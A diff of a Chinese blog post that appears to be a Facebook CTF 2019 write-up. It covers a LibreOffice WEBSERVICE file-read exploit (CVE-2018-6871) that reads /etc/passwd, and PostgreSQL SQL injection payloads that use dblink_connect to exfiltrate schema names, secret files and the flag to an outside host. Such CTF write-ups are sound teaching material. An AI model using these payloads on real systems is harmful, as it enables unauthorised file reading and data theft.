+<h3 id="pdfme"><a href="#pdfme" class="headerlink" title="pdfme"></a>pdfme</h3><p><img src="https://github.com/AidanFray/CTF_Writeups/raw/master/2019/FacebookCTF/pdfme/images/start.png" alt=""><br>只能上传<code>.fods</code>文件，在网上找了个：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;office:document xmlns:office=&quot;urn:oasis:names:tc:opendocument:xmlns:office:1.0&quot;  xmlns:style=&quot;urn:oasis:names:tc:opendocument:xmlns:style:1.0&quot;  xmlns:text=&quot;urn:oasis:names:tc:opendocument:xmlns:text:1.0&quot;  xmlns:table=&quot;urn:oasis:names:tc:opendocument:xmlns:table:1.0&quot;  xmlns:draw=&quot;urn:oasis:names:tc:opendocument:xmlns:drawing:1.0&quot;  xmlns:fo=&quot;urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0&quot;  xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;  xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;  xmlns:meta=&quot;urn:oasis:names:tc:opendocument:xmlns:meta:1.0&quot;  xmlns:number=&quot;urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0&quot;  xmlns:presentation=&quot;urn:oasis:names:tc:opendocument:xmlns:presentation:1.0&quot;  xmlns:svg=&quot;urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0&quot;  xmlns:chart=&quot;urn:oasis:names:tc:opendocument:xmlns:chart:1.0&quot;  xmlns:dr3d=&quot;urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0&quot;  xmlns:math=&quot;http://www.w3.org/1998/Math/MathML&quot;  xmlns:form=&quot;urn:oasis:names:tc:opendocument:xmlns:form:1.0&quot;  xmlns:script=&quot;urn:oasis:names:tc:opendocument:xmlns:script:1.0&quot;  xmlns:config=&quot;urn:oasis:names:tc:opendocument:xmlns:config:1.0&quot;  xmlns:ooo=&quot;http://openoffice.org/2004/office&quot;  xmlns:ooow=&quot;http://openoffice.org/2004/writer&quot;  xmlns:oooc=&quot;http://openoffice.org/2004/calc&quot;  xmlns:dom=&quot;http://www.w3.org/2001/xml-events&quot;  xmlns:xforms=&quot;http://www.w3.org/2002/xforms&quot;  xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xmlns:rpt=&quot;http://openoffice.org/2005/report&quot;  xmlns:of=&quot;urn:oasis:names:tc:opendocument:xmlns:of:1.2&quot;  xmlns:xhtml=&quot;http://www.w3.org/1999/xhtml&quot;  xmlns:grddl=&quot;http://www.w3.org/2003/g/data-view#&quot;  xmlns:tableooo=&quot;http://openoffice.org/2009/table&quot;  xmlns:drawooo=&quot;http://openoffice.org/2010/draw&quot;  xmlns:calcext=&quot;urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0&quot;  xmlns:loext=&quot;urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0&quot;  xmlns:field=&quot;urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0&quot;  xmlns:formx=&quot;urn:openoffice:names:experimental:ooxml-odf-interop:xmlns:form:1.0&quot;  xmlns:css3t=&quot;http://www.w3.org/TR/css3-text/&quot; office:version=&quot;1.2&quot; office:mimetype=&quot;application/vnd.oasis.opendocument.spreadsheet&quot;&gt;
+    &lt;office:body&gt;
+        &lt;office:spreadsheet&gt;
+            &lt;table:table table:name=&quot;1&quot;&gt;
+                &lt;table:table-column/&gt;
+                &lt;table:table-row&gt;
+                    &lt;table:table-cell office:value-type=&quot;string&quot; calcext:value-type=&quot;string&quot;&gt;
+                        &lt;text:p&gt;TEXT&lt;/text:p&gt;
+                    &lt;/table:table-cell&gt;
+                &lt;/table:table-row&gt;
+                &lt;table:table-row&gt;&lt;/table:table-row&gt;
+            &lt;/table:table&gt;
+            &lt;table:named-expressions/&gt;
+        &lt;/office:spreadsheet&gt;
+    &lt;/office:body&gt;
+&lt;/office:document&gt;
+</code></pre><p>他会渲染为pdf：</p>
 <p><img src="https://i.loli.net/2019/06/11/5cfe8ff9c303f36290.png" alt=""><br>将pdf下载下来，利用exiftool查看文件信息：<br><img src="https://i.loli.net/2019/06/11/5cff2e6c83e7924512.png" alt=""><br>注意到<strong>libreoffice</strong>，查找相关漏洞，最后落到了<a href="https://www.exploit-db.com/exploits/44022" target="_blank" rel="noopener">CVE-2018-6871</a>，差不多是协议的问题：</p>
 <blockquote>
 <p>For protocols that are not supported, such as ftp: // or file: //, WEBSERVICE returns the #VALUE! error value.</p>
 <p>In LibreOffice, these restrictions are not implemented before 5.4.5/6.0.1</p>
 </blockquote>
-<p>将<code>table:table-cell</code>这一部分进行替换，改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;table:table-cell </span><br><span class="line">     table:formula=&quot;of:=COM.MICROSOFT.WEBSERVICE(&amp;quot;/etc/passwd&amp;quot;)&quot; </span><br><span class="line">     office:value-type=&quot;string&quot; </span><br><span class="line">     office:string-value=&quot;&quot; </span><br><span class="line">     calcext:value-type=&quot;string&quot;&gt;</span><br><span class="line">  &lt;text:p&gt;#VALUE!&lt;/text:p&gt;</span><br><span class="line">&lt;/table:table-cell&gt;</span><br></pre></td></tr></table></figure></p>
-<p>得到：<br><img src="https://github.com/AidanFray/CTF_Writeups/raw/master/2019/FacebookCTF/pdfme/images/passwd.png" alt=""><br>根据给出的用户，于是我们尝试查询<code>/home/libreoffice_admin/flag</code>,最终读到flag<br><img src="https://i.loli.net/2019/06/11/5cff3642cb56094273.png" alt=""></p>
+<p>将<code>table:table-cell</code>这一部分进行替换，改为：</p>
+<pre><code>      &lt;table:table-cell 
+          table:formula=&quot;of:=COM.MICROSOFT.WEBSERVICE(&amp;quot;/etc/passwd&amp;quot;)&quot; 
+          office:value-type=&quot;string&quot; 
+          office:string-value=&quot;&quot; 
+          calcext:value-type=&quot;string&quot;&gt;
+       &lt;text:p&gt;#VALUE!&lt;/text:p&gt;
+     &lt;/table:table-cell&gt;
+</code></pre><p>得到：<br><img src="https://github.com/AidanFray/CTF_Writeups/raw/master/2019/FacebookCTF/pdfme/images/passwd.png" alt=""><br>根据给出的用户，于是我们尝试查询<code>/home/libreoffice_admin/flag</code>,最终读到flag<br><img src="https://i.loli.net/2019/06/11/5cff3642cb56094273.png" alt=""></p>
 <h3 id="hr-admin-module"><a href="#hr-admin-module" class="headerlink" title="hr_admin_module"></a>hr_admin_module</h3><p>题目描述：</p>
 <blockquote>
 <p>While tying down the application the developer may have had trouble revoking the permission on one or two functions. Let’s hope this got sorted. At least he made sure the site feels really fast.</p>
@@ -83,23 +293,32 @@ We created this web interface to run commands on our servers, but since we haven
 </ol>
 <p>第二个方法似乎更为简单</p>
 <p><code>dblink</code>是一个支持在一个数据库会话中连接到其他PostgreSQL数据库的模块。<br><code>dblink_connect</code> – 打开一个到远程数据库的持久连接</p>
-<p>在自己的服务器上安装<code>postgresql</code>，在配置文件<code>postgresql.conf</code>中设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen_addresses = &apos;*&apos;</span><br></pre></td></tr></table></figure></p>
-<p>利用tcpdump监听<code>5432</code>端口，查看请求包的信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -nX -i eth0 port 5432</span><br></pre></td></tr></table></figure></p>
-<p>postgresql安装后默认用户为<code>postgres</code>，无密码，且有一个<code>postgres</code>的数据库，有意思的一点是，建议将密码或用户参数填写错误，因为这样才能返回查询信息</p>
-<p>修改payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=postgres password= dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
-<p>携带了连接信息：<br><img src="https://i.loli.net/2019/06/13/5d01fb1ee087f78253.png" alt=""></p>
-<p>列出schema：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT string_agg(schema_name,&apos;:&apos;) FROM information_schema.schemata) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2019/06/13/5d01fbce5191773760.png" alt=""></p>
+<p>在自己的服务器上安装<code>postgresql</code>，在配置文件<code>postgresql.conf</code>中设置：</p>
+<pre><code>listen_addresses = &#39;*&#39;
+</code></pre><p>利用tcpdump监听<code>5432</code>端口，查看请求包的信息：</p>
+<pre><code>tcpdump -nX -i eth0 port 5432
+</code></pre><p>postgresql安装后默认用户为<code>postgres</code>，无密码，且有一个<code>postgres</code>的数据库，有意思的一点是，建议将密码或用户参数填写错误，因为这样才能返回查询信息</p>
+<p>修改payload：</p>
+<pre><code>a&#39; UNION SELECT 1,(SELECT dblink_connect(&#39;host=IP user=postgres password= dbname=postgres&#39;)) --
+</code></pre><p>携带了连接信息：<br><img src="https://i.loli.net/2019/06/13/5d01fb1ee087f78253.png" alt=""></p>
+<p>列出schema：</p>
+<pre><code>a&#39; UNION SELECT 1,(SELECT dblink_connect(&#39;host=IP user=&#39; || (SELECT string_agg(schema_name,&#39;:&#39;) FROM information_schema.schemata) || &#39; password=postgres dbname=postgres&#39;)) --
+</code></pre><p><img src="https://i.loli.net/2019/06/13/5d01fbce5191773760.png" alt=""></p>
 <blockquote>
 <p>String_agg：有两个参数一个是需要合并的字段名称或者字面量，还有就是合并后以何种分隔符，即：string_agg(expression, delimiter)。</p>
 </blockquote>
-<p>列出当前schema的table：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT string_agg(tablename, &apos;:&apos;) FROM pg_catalog.pg_tables WHERE schemaname=current_schema()) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2019/06/13/5d01fd22325a750489.png" alt=""></p>
-<p>列出searches的行数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT COUNT(*) FROM searches) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
-<p>发现为空，说明没有内容<br>由于<code>pg_read_file</code>不能用，我们可以使用<code>lo_import</code>将文件的内容加载到<code>pg_largeobject</code>目录中。如果查询成功，我们将获得对象的<code>oid</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT lo_import(&apos;/var/lib/postgresql/data/secret&apos;)) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2019/06/13/5d0201e048b8e69600.png" alt=""><br>成功了！！！</p>
-<p>每个文件都可以对应于一个oid<br>我们可以通过从pg_largeobject_metadata中提取来获取可用对象的oid列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT string_agg(cast(l.oid as text), &apos;:&apos;) FROM pg_largeobject_metadata l) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2019/06/13/5d0202849d7c926302.png" alt=""></p>
-<p>我们尝试挨个读取，最终在<code>16444</code>读到了flag内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1,(SELECT dblink_connect(&apos;host=IP user=&apos; || (SELECT convert_from(lo_get(16444), &apos;UTF8&apos;)) || &apos; password=postgres dbname=postgres&apos;)) --</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://i.loli.net/2019/06/13/5d0202971c8cd90441.png" alt=""></p>
-</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2019-06-12</span><i class="fa fa-tag"></i><a class="tag" href="/tags/ctf/" title="ctf">ctf </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://microvorld.com/2019/06/12/CTF/fbctf2019/,damn1t,fbctf2019,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2019/06/15/vulnerable/MyBB  Stored XSS to RCE/" title="MyBB &lt;= 1.8.20--(From Stored XSS to RCE)">上一篇</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2019/06/06/CTF/qwb2019/" title="qwbctf2019">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
+<p>列出当前schema的table：</p>
+<pre><code>a&#39; UNION SELECT 1,(SELECT dblink_connect(&#39;host=IP user=&#39; || (SELECT string_agg(tablename, &#39;:&#39;) FROM pg_catalog.pg_tables WHERE schemaname=current_schema()) || &#39; password=postgres dbname=postgres&#39;)) --
+</code></pre><p><img src="https://i.loli.net/2019/06/13/5d01fd22325a750489.png" alt=""></p>
+<p>列出searches的行数</p>
+<pre><code>a&#39; UNION SELECT 1,(SELECT dblink_connect(&#39;host=IP user=&#39; || (SELECT COUNT(*) FROM searches) || &#39; password=postgres dbname=postgres&#39;)) --
+</code></pre><p>发现为空，说明没有内容<br>由于<code>pg_read_file</code>不能用，我们可以使用<code>lo_import</code>将文件的内容加载到<code>pg_largeobject</code>目录中。如果查询成功，我们将获得对象的<code>oid</code>。</p>
+<pre><code>a&#39; UNION SELECT 1,(SELECT dblink_connect(&#39;host=IP user=&#39; || (SELECT lo_import(&#39;/var/lib/postgresql/data/secret&#39;)) || &#39; password=postgres dbname=postgres&#39;)) --
+</code></pre><p><img src="https://i.loli.net/2019/06/13/5d0201e048b8e69600.png" alt=""><br>成功了！！！</p>
+<p>每个文件都可以对应于一个oid<br>我们可以通过从pg_largeobject_metadata中提取来获取可用对象的oid列表</p>
+<pre><code>a&#39; UNION SELECT 1,(SELECT dblink_connect(&#39;host=IP user=&#39; || (SELECT string_agg(cast(l.oid as text), &#39;:&#39;) FROM pg_largeobject_metadata l) || &#39; password=postgres dbname=postgres&#39;)) --
+</code></pre><p><img src="https://i.loli.net/2019/06/13/5d0202849d7c926302.png" alt=""></p>
+<p>我们尝试挨个读取，最终在<code>16444</code>读到了flag内容</p>
+<pre><code>a&#39; UNION SELECT 1,(SELECT dblink_connect(&#39;host=IP user=&#39; || (SELECT convert_from(lo_get(16444), &#39;UTF8&#39;)) || &#39; password=postgres dbname=postgres&#39;)) --
+</code></pre><p><img src="https://i.loli.net/2019/06/13/5d0202971c8cd90441.png" alt=""></p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2019/06/12/CTF/fbctf2019/">http://microvorld.com/2019/06/12/CTF/fbctf2019/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/06/15/vulnerable/MyBB  Stored XSS to RCE/" title="MyBB &lt;= 1.8.20--(From Stored XSS to RCE)"><span>< PreviousPost</span><br><span class="prevTitle">MyBB &lt;= 1.8.20--(From Stored XSS to RCE)</span></a><a class="nextSlogan" href="/2019/06/06/CTF/qwb2019/" title="qwbctf2019"><span>NextPost ></span><br><span class="nextTitle">qwbctf2019</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Facebook-ctf-2019"><span class="toc-number">1.</span> <span class="toc-text">Facebook ctf 2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rceservice"><span class="toc-number">1.1.1.</span> <span class="toc-text">rceservice</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#events"><span class="toc-number">1.1.2.</span> <span class="toc-text">events</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#products-manager"><span class="toc-number">1.1.3.</span> <span class="toc-text">products manager</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pdfme"><span class="toc-number">1.1.4.</span> <span class="toc-text">pdfme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hr-admin-module"><span class="toc-number">1.1.5.</span> <span class="toc-text">hr_admin_module</span></a></li></ol></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
